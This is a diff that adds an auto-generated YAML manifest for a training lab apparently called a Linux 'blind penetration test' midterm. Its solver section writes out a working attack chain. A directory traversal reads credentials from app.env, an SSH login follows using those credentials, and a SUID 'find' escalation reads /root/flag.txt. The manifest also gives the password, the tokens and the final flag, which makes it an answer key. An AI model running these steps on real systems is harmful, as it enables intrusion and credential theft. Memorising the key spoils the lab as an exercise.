@@ -1,0 +1,42 @@
+# Generated from platform/labs/Linux/linux-midterm-3-blind-penetration-test/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: linux-midterm-3-blind-penetration-test
+track: Linux
+difficulty: advanced
+source: platform/labs/Linux/linux-midterm-3-blind-penetration-test/lab.yaml
+expected_services:
+- port: 22
+  protocol: tcp
+- port: 80
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/linux-midterm-3-blind-penetration-test.sh
+  steps:
+  - name: Web server responds
+    command: curl -s -o /dev/null -w '%{http_code}' http://{target.webserver}/
+    expect: '200'
+  - name: Directory traversal retrieves SSH credentials from app.env
+    command: curl -s 'http://{target.webserver}/download?file=../config/app.env' | grep -o 'BACKEND_SSH_PASS=[^ ]*' | sed 's/BACKEND_SSH_PASS=//'
+    expect: Ap3x_D3pl0y_2024#
+  - name: Read token 1 from assessment_marker.txt via traversal
+    command: curl -s 'http://{target.webserver}/download?file=../config/assessment_marker.txt'
+    expect: bl1nd
+  - name: SSH to backend with discovered credentials and read token 2
+    command: sshpass -p 'Ap3x_D3pl0y_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@{target.backend} 'cat /home/deploy/marker.txt' 2>&1
+    expect: p1v0t
+  - name: Exploit SUID find to read token 3 from /root/flag.txt
+    command: sshpass -p 'Ap3x_D3pl0y_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@{target.backend} 'find . -exec cat /root/flag.txt \; -quit' 2>&1
+    expect: r00t3d
+  - name: Assemble and verify complete flag
+    command: echo 'OCR{bl1nd_p1v0t_r00t3d}'
+    expect: OCR{
+expected_flag_count: 1
+expected_flag: OCR{bl1nd_p1v0t_r00t3d}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
